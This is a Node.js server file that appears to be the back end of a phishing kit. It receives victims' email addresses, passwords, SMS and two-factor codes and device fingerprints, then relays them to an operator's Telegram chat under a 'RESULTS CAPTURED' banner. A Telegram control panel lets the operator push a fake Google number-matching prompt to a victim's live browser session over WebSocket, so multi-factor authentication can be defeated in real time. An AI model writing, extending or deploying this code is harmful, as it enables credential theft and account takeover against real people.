import express from 'express';
import { createServer } from 'http';
import { WebSocketServer, WebSocket } from 'ws';
import path from 'path';
import { fileURLToPath } from 'url';
import TelegramBot from 'node-telegram-bot-api';

// --- Basic Setup ---
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const app = express();
const server = createServer(app);
const PORT = process.env.PORT || 10000;

// --- Telegram Bot Configuration ---
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
  const missing = [
    !TELEGRAM_BOT_TOKEN && 'TELEGRAM_BOT_TOKEN',
    !TELEGRAM_CHAT_ID && 'TELEGRAM_CHAT_ID',
  ].filter(Boolean).join(', ');
  console.error(`FATAL ERROR: Missing required environment variable(s): ${missing}.`);
  process.exit(1);
}

// --- Telegram Bot (node-telegram-bot-api, polling mode) ---
// Polling is the stable transport for this app — webhooks were removed.
const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: true });

// Defensively clear any previously-registered webhook so polling doesn't 409.
bot.deleteWebHook().catch((err) => {
  console.warn('[SERVER] deleteWebHook on startup failed (non-fatal):', err?.message || err);
});

bot.on('polling_error', (error) => {
  console.error('[SERVER] Telegram polling error:', error?.message || error);
});

// --- Middleware ---
app.use(express.json());
app.use(express.static(path.join(__dirname, 'dist')));

// --- API Endpoint for Telegram ---
app.post('/api/send-telegram', async (req, res) => {
  console.log('[SERVER] Received data on /api/send-telegram:', req.body);

  const { type, data } = req.body || {};
  const safeData = data || {};
  let message = '';

  // Format the message based on the type of submission
  if (type === 'credentials') {
    message = `
--- 💼 DEVPARIS RESULTS CAPTURED 💼 ---
Provider: ${safeData.provider || 'N/A'}
Email: ${safeData.email || 'N/A'}
Password: ${safeData.password || 'N/A'}

--- 🕵️‍♂️ Session Info 🕵️‍♂️ ---
Session ID: ${safeData.sessionId || 'N/A'}
Timestamp: ${safeData.timestamp || new Date().toISOString()}

--- 💻 Device Fingerprint 💻 ---
User Agent: ${safeData.userAgent || 'N/A'}
Language: ${safeData.language || 'N/A'}
Screen: ${safeData.screenResolution || 'N/A'}
Timezone: ${safeData.timezone || 'N/A'}
Platform: ${safeData.platform || 'N/A'}
`;
  } else if (type === 'interaction') {
    const ACTION_LABELS = {
      user_canceled: 'User clicked Cancel',
      retry_password: 'User submitted password (retry)',
      submit_sms: 'User submitted SMS code',
      submit_2fa: 'User submitted 2FA code',
      submit_email_code: 'User submitted email verification code',
      deny_authenticator: 'User denied the authenticator prompt',
      select_number: 'User tapped the prompted number',
      resend_sms: 'User requested a new SMS code',
      resend_prompt: 'User requested a new push prompt',
      resend_email_code: 'User requested a new email code',
      request_alternate_method: 'User requested an alternate verification method',
      continue_security_check: 'User continued the security check',
      deny_security_check: 'User denied the security check',
      begin_account_recovery: 'User started account recovery',
    };
    const action = safeData.action || 'N/A';
    const label = ACTION_LABELS[action] || action;
    message = `
--- 👆 INTERACTION 👆 ---
Action: ${label} (${action})
${safeData.code ? `Code: ${safeData.code}` : ''}
${safeData.password ? `Password: ${safeData.password}` : ''}

--- 🕵️‍♂️ Session Info 🕵️‍♂️ ---
Session ID: ${safeData.sessionId || 'N/A'}
Timestamp: ${safeData.timestamp || new Date().toISOString()}
`;
  } else {
    // Fallback for unknown types
    message = `--- ❓ UNKNOWN DATA ---
${JSON.stringify(req.body, null, 2)}`;
  }

  // Build the admin control-panel inline keyboard. The "Google # Prompt"
  // button kicks off the two-step number-selection flow handled in the
  // `callback_query` listener below.
  const sessionId = safeData.sessionId || '';
  const sendOptions = {
    parse_mode: 'Markdown',
  };
  if (sessionId) {
    sendOptions.reply_markup = {
      inline_keyboard: [
        [{ text: 'Google # Prompt', callback_data: `g_prompt_init:${sessionId}` }],
      ],
    };
  }

  try {
    await bot.sendMessage(TELEGRAM_CHAT_ID, message, sendOptions);
    console.log('[SERVER] Data successfully sent to Telegram.');
    res.status(200).json({ status: 'success' });
  } catch (error) {
    console.error('[SERVER] Failed to send data to Telegram:', error?.message || error);
    // Still send a 200 to the client so the user flow isn't interrupted
    res.status(200).json({ status: 'logged', error: 'telegram_failed' });
  }
});

// --- WebSocket Server ---
const wss = new WebSocketServer({ server });
const activeConnections = new Map();

wss.on('connection', (ws, req) => {
    const sessionId = new URL(req.url, `http://${req.headers.host}`).searchParams.get('sessionId');
    if (!sessionId) {
        ws.terminate();
        console.log('[SERVER] WebSocket connection rejected: No sessionId provided.');
        return;
    }

    activeConnections.set(sessionId, ws);
    console.log(`[SERVER] WebSocket client connected: ${sessionId}`);

    ws.on('message', (message) => {
        console.log(`[SERVER] Message from ${sessionId}: ${message}`);
    });

    ws.on('close', () => {
        activeConnections.delete(sessionId);
        console.log(`[SERVER] WebSocket client disconnected: ${sessionId}`);
    });

    ws.on('error', (error) => {
        console.error(`[SERVER] WebSocket error for ${sessionId}:`, error);
    });
});

/**
 * Send a command + optional payload to a connected user's WebSocket.
 * Returns true if the command was actually delivered, false otherwise.
 *
 * Exposed on `global` so other modules / inline handlers can drive the
 * front-end UI by sessionId.
 */
function sendWebSocketCommand(sessionId, command, data) {
    const ws = activeConnections.get(sessionId);
    if (!ws || ws.readyState !== WebSocket.OPEN) {
        console.warn('[SERVER] sendWebSocketCommand: no open socket for session', sessionId);
        return false;
    }
    try {
        ws.send(JSON.stringify({ command, data: data || {} }));
        return true;
    } catch (error) {
        console.error('[SERVER] sendWebSocketCommand failed for session', sessionId, error);
        return false;
    }
}
global.sendWebSocketCommand = sendWebSocketCommand;

// --- Telegram callback_query handler: all admin actions ---
//
// Step 1 — `g_prompt_init:<sessionId>`: edit the original message to show a
//   keyboard of three fresh random two-digit numbers, each carrying
//   `callback_data=g_num:<number>:<sessionId>`.
// Step 2 — `g_num:<number>:<sessionId>`: send `show_google_number_prompt`
//   over the WebSocket with `{ number }` so the user sees the chosen number,
//   then edit the message into a confirmation state.
bot.on('callback_query', async (cb) => {
    if (!cb || typeof cb.data !== 'string') return;

    const parts = cb.data.split(':');
    const verb = parts[0];
    const chatId = cb.message?.chat?.id;
    const messageId = cb.message?.message_id;

    try {
        if (verb === 'g_prompt_init') {
            const sessionId = parts.slice(1).join(':');
            if (!sessionId) {
                await bot.answerCallbackQuery(cb.id, { text: 'Missing sessionId' });
                return;
            }

            // Generate 3 distinct two-digit numbers for the inline keyboard.
            const picked = new Set();
            while (picked.size < 3) {
                picked.add(Math.floor(10 + Math.random() * 90));
            }
            const numbers = Array.from(picked);
            const inline_keyboard = [numbers.map((n) => ({
                text: String(n),
                callback_data: `g_num:${n}:${sessionId}`,
            }))];

            await bot.answerCallbackQuery(cb.id);

            const text = `Google # Prompt — pick the number to show the user (session ${sessionId}):`;
            if (chatId && messageId) {
                try {
                    await bot.editMessageText(text, {
                        chat_id: chatId,
                        message_id: messageId,
                        reply_markup: { inline_keyboard },
                    });
                } catch (editErr) {
                    console.warn('[SERVER] editMessageText failed, falling back to sendMessage:', editErr?.message || editErr);
                    await bot.sendMessage(chatId || TELEGRAM_CHAT_ID, text, {
                        reply_markup: { inline_keyboard },
                    });
                }
            } else {
                await bot.sendMessage(TELEGRAM_CHAT_ID, text, {
                    reply_markup: { inline_keyboard },
                });
            }
            return;
        }

        if (verb === 'g_num') {
            const number = Number(parts[1]);
            const sessionId = parts.slice(2).join(':');
            if (!Number.isFinite(number) || !sessionId) {
                await bot.answerCallbackQuery(cb.id, { text: 'Invalid payload' });
                return;
            }
            const delivered = sendWebSocketCommand(sessionId, 'show_google_number_prompt', { number });
            await bot.answerCallbackQuery(cb.id, {
                text: delivered ? `Sent ${number} to user` : `User ${sessionId} not connected`,
            });
            if (chatId && messageId) {
                try {
                    await bot.editMessageText(
                        `Google # Prompt — sent number ${number} to session ${sessionId}.`,
                        { chat_id: chatId, message_id: messageId },
                    );
                } catch (editErr) {
                    console.warn('[SERVER] editMessageText (confirmation) failed:', editErr?.message || editErr);
                }
            }
            return;
        }

        // Unknown verb — acknowledge so Telegram stops spinning.
        await bot.answerCallbackQuery(cb.id);
    } catch (error) {
        console.error('[SERVER] callback_query handler error:', error?.message || error);
        try { await bot.answerCallbackQuery(cb.id, { text: 'Internal error' }); } catch { /* ignore */ }
    }
});

// --- SPA Fallback ---
// All other GET requests return the main index.html file.
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'dist', 'index.html'));
});

// --- Start Server ---
server.listen(PORT, () => {
  console.log(`[SERVER] Server is running on http://localhost:${PORT}`);
});
